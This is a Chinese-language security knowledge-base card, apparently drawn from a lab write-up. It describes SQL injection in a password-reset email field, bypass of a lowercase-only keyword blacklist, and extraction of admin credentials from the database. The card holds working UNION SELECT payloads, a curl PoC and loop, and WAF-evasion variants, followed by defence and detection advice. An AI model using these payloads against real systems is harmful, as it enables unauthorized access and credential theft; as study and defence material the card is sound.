---
id: web-generic-sqli-supercms-forgot-email-union-case-bypass
title: 密码找回 email 参数 UNION 注入：小写关键字被拦、大写 UNION SELECT 绕过并把查询结果回显到发信提示
type: scenario
domain: web
path: web/generic/sqli
technique: forgot-email-union-case-sensitive-keyword-bypass
tags:
- sqli
- mysql
- union
- waf-bypass
- case-sensitivity
- php
- password-reset
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V622
  verified_at: '2026-11-12T22:03:11+08:00'
  notes: 已对照原文与全部45张图核对：单引号报Error in Database!/双引号User not found（图08/09）；or 1=1 limit回显Email sent to test1@a.com:test1（图10）；小写union被拦仅返回Error（图12），大写UNION SELECT三列报Error in Database!（列数不符，图13），四列第4位放邮箱后回显（图16）；group_concat枚举schemata/tables/columns（图18/20/21），operators账号密码（图22/23），MD5查询tamarro（图24）。已修正原卡将小写拦截返回误写为Error in Database!的措辞。dedup：与case-sensitive-blacklist-backslash-blind-ascii等10候选均非同链（report verdict related/new），dup-scan无涉及pair。未验证点：未实际请求目标；库为原文环境supercms，无明确版本号故不设affected_versions。
url: /docs/web/generic/sqli/web-generic-sqli-supercms-forgot-email-union-case-bypass/
draft: false
kb_aliases:
- SuperCMS 密码找回注入
- forgot.php SQL 注入
- 邮箱参数联合查询注入
- UNION SELECT 大小写绕过 WAF
- 发信提示回显注入结果
---

## 一句话结论

密码找回接口把 email 参数单引号拼接进查询时，提交单引号报数据库错误、提交双引号却正常返回"用户不存在"即可确认注入；过滤只匹配小写关键字时，改用大写 `UNION SELECT` 即可带入联合查询，并借页面"邮件已发送到 {email}:{password}"的提示把联合查询结果直接回显，逐步读出库名、表名、列名和管理员账号密码。

## 原理

- **引号差分确认注入**：`email=a@b.c'` 触发 `Error in Database!`，而 `email=a@b.com"` 返回 `User not found with that email!`，说明参数落在单引号字符串内，双引号只是普通字符。
- **恒真条件做行枚举**：`email=a@b.c' or 1=1 limit 0,1;-- -` 让 WHERE 恒真，页面把命中的账号邮箱与密码（原文示例 `test1@a.com:test1`）展示在 `Email sent to ...` 提示中；递增 `limit` 偏移即可逐行枚举有效账号。这个回显不是盲注，而是业务本来就要展示"发信目标与重置凭据"。
- **列数与回显位**：试探出查询为 4 列；第 4 列要放合法邮箱格式（页面逻辑会按邮箱校验/展示），第 2 列内容出现在密码位置。`UNION SELECT 1,schema_name,3,'a@b.c' from information_schema.schemata` 即把库名回显在提示里。
- **大小写敏感黑名单绕过**：小写 `union select 1,2,3-- -` 返回 `Error`（被拦截，未到达数据库）；改成大写 `UNION SELECT 1,2,3-- -` 后请求进入 SQL，因列数不符返回 `Error in Database!`，补齐第 4 列合法邮箱的 `UNION SELECT 1,2,3,'a@b.c'-- -` 即正常回显。SQL 关键字大小写不敏感，而过滤器按小写字面量匹配，等价于只拦一种写法。
- **group_concat 一次拖列**：`group_concat(table_name)`/`group_concat(column_name)` 把整列合并为一行回显，避开逐行 limit 读取。
- **为什么成立**：SQL 由字符串拼接且无参数化；过滤是朴素黑名单且大小写策略错误；业务把查询结果的一部分回显给用户，形成稳定的 UNION 回显通道。

## 触发条件

- PHP/MySQL 密码找回接口，email 参数直接拼进单引号 SQL，未使用预处理语句。
- 错误信息或业务提示可观察（报错页，或"邮件已发送到 xxx"回显行）。
- 过滤/黑名单只匹配小写关键字（或大小写处理有缺口），未拦截 UNION 与注释符。
- 联合查询列数可探测，页面存在稳定回显位置。

## 利用步骤

1. 差分确认：`email=a@b.c'` 报数据库错误，`email=a@b.com"` 返回用户不存在。
2. `email=a@b.c' or 1=1 limit 0,1;-- -` 确认提示回显账号邮箱与密码；递增 limit 枚举有效账号。
3. 试探列数与回显位：`' UNION SELECT 1,2,3,'a@b.c'-- -`；第 4 列放合法邮箱。
4. 读库名：`' UNION SELECT 1,schema_name,3,'a@b.c' from information_schema.schemata limit i,1-- -`，或 `group_concat(schema_name)`。
5. 读表：`... group_concat(table_name) ... from information_schema.tables where table_schema='supercms'`。
6. 读列：`... group_concat(column_name) ... from information_schema.columns where table_name='operators'`。
7. 拖账号：`... group_concat(concat(__username_,':',__password_)) ... from operators`，MD5 离线破解弱口令后登录后台。
8. 若小写黑名单拦截，混用大小写（`UNioN SeLeCt`）或注释分割继续。

## PoC

```bash
# 1) 引号差分
curl -s http://target/cmsdata/forgot.php --data-urlencode "email=a@b.c'"
curl -s http://target/cmsdata/forgot.php --data-urlencode 'email=a@b.com"'

# 2) 恒真条件枚举账号（提示行为 Email sent to 邮箱:密码）
for i in $(seq 0 300); do
  curl -s -d "email=a@b.c' or 1=1 limit $i,1;-- -" \
    http://target/cmsdata/forgot.php | grep -o '<h2>.*</h2>'
done

# 3) 大写 UNION SELECT 绕过 + 回显库名
curl -s -d "email=a@b.c' UNION SELECT 1,schema_name,3,'a@b.c' from information_schema.schemata limit 0,1-- -" \
  http://target/cmsdata/forgot.php

# 4) group_concat 拖 operators 账号密码
curl -s -d "email=a@b.c' UNioN SELECT 1,group_concat(concat(__username_,':',__password_)),3,'a@b.c' from operators-- -" \
  http://target/cmsdata/forgot.php
```

说明：`a@b.c` 需换成能通过上层邮箱格式校验的值；必要时做 URL 编码。原文还演示了按行枚举用户名的 shell 循环与 `information_schema` 逐层枚举脚本。

## 变体与关联

- 变体：注释符 `-- -` / `#` / `--+` 视驱动而定；列数不同用 `ORDER BY` 探测；无回显时改盲注、时间盲注或报错注入。
- 变体：黑名单只拦小写 `union`/`select` 时，大小写混排即可；若黑名单大小写不敏感，改用注释分割（`UN/**/ION`）、换行、MySQL 版本注释 `/*!50000UNION*/`。
- 关联：[[web-generic-sqli-case-sensitive-blacklist-backslash-blind-ascii]]（同样利用大小写敏感检测缺陷，但走反斜杠吞引号 + ASCII 盲注）；[[web-generic-sqli-union-seven-step-extraction]]（通用 UNION 脱库流程）；[[web-generic-sqli-error-based-extraction]]。
- 边界：email 参数经过强类型/白名单校验、或页面完全无回显且限制频率时，本流程需要改为盲注。

## 检测与防御

- 使用预处理语句/参数化查询，禁止把 email 拼进 SQL；对邮箱做格式白名单。
- 黑名单不是安全边界；如必须拦截，关键字匹配必须大小写不敏感并规范化注释、空白、编码，优先用 SQL 语法解析而非字符串匹配。
- 关闭数据库错误回显；找回接口加验证码与限速；统一成功/失败提示，减少布尔 oracle。
- 检测：同一来源对找回接口高频提交含 `UNION`/`SELECT`/注释符/引号的 email；响应中出现 `information_schema` 或异常报错。
